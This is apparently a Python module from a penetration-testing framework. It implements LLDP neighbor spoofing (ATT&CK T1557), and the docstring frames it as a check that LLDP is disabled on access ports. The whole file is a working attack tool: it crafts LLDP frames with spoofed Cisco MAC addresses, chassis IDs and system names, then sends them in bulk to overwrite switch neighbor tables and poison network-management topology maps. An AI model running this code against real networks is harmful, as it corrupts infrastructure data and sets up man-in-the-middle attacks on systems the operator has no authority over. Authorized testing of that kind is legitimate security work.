"""
LLDP Neighbor Spoofing — T1557

Injects spoofed LLDP frames to overwrite neighbor entries on LLDP-capable
switches. Poisons NMS topology maps and tests whether LLDP is disabled on
access ports (CIS Benchmark requirement).
"""
import random
import struct

from scapy.all import Ether, sendp

NAME = "lldp"
DESCRIPTION = "LLDP neighbor spoofing — overwrite switch neighbor table"
ATTCK_ID = "T1557"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info("START | technique=%s | iface=%s | chassis=%s | count=%d",
                ATTCK_ID, args.interface, args.chassis_id, args.count)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--chassis-id", default="Cisco-Switch-01",
                   help="Chassis ID to spoof (default: Cisco-Switch-01)")
    p.add_argument("--port-id", default="GigabitEthernet1/0/1")
    p.add_argument("--count", "-c", type=int, default=50)
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print
    pkts = _gen_packets(args.count, args.chassis_id, args.port_id)
    try:
        for i, pkt in enumerate(pkts):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 10 == 0:
                _log(f"[LLDP] {i+1}/{len(pkts)}")
        _log(f"[LLDP] Sent {len(pkts)} LLDP frames")
        return True
    except Exception as e:
        _log(f"[LLDP] Error: {e}")
        return False


def _gen_packets(count, chassis_id, port_id):
    pkts = []
    for _ in range(count):
        oui = "00:00:0c"
        nic = ":".join(f"{random.randint(0,255):02x}" for _ in range(3))
        src = f"{oui}:{nic}"
        system_name = f"Cisco-Catalyst-{random.randint(2900, 3900)}"
        pkts.append(_build(src, chassis_id, port_id, system_name))
    return pkts


def _build(src_mac, chassis_id, port_id, system_name):
    payload = b""

    def tlv(t, value: bytes):
        return struct.pack(">H", (t << 9) | len(value)) + value

    payload += tlv(1, b"\x04" + chassis_id.encode())      # Chassis ID
    payload += tlv(2, b"\x03" + port_id.encode())         # Port ID
    payload += tlv(3, struct.pack(">H", 120))             # TTL = 120s
    payload += tlv(5, system_name.encode())               # System Name
    payload += b"\x00\x00"                                # End of LLDPDU

    return Ether(dst="01:80:c2:00:00:0e", src=src_mac, type=0x88CC) / payload
